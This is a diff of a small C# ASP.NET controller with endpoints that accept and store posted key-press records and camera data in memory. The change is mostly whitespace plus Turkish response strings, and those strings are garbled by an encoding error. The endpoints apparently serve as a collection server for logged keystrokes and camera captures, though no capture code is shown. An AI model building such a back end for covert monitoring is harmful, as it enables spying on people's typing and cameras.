@@ -13,7 +13,7 @@ namespace ServerApi.Controllers
         public string Timestamp { get; set; }
     }
 
-  
+
 
     public class CameraDataModel
     {
@@ -26,16 +26,18 @@ namespace ServerApi.Controllers
         public string Timestamp { get; set; }
     }
 
+   
+
     [ApiController]
     [Route("api/[controller]")]
     public class MessageController : ControllerBase
     {
         private static List<KeyPressModel> _keyPresses = new List<KeyPressModel>();
-     
+
         private static List<CameraDataModel> _cameraData = new List<CameraDataModel>();
 
         // POST: api/message/keypress
-      
+
         [HttpPost("keypress")]
         public IActionResult PostKeyPress([FromBody] KeyPressModel keyPress)
         {
@@ -62,19 +64,21 @@ namespace ServerApi.Controllers
         {
             return Ok(_cameraData);
         }
-        
+
         // POST: api/message/camera
+
+       
+
         [HttpPost("camera")]
         public IActionResult PostCameraData([FromBody] CameraDataModel cameraData)
         {
-
             if (cameraData == null)
             {
-                return BadRequest("Invalid input");
+                return BadRequest("Geçersiz giriþ");
             }
 
             _cameraData.Add(cameraData);
-            return Ok("Camera data received!");
+            return Ok("Kamera verisi alýndý!");
         }
     }
 
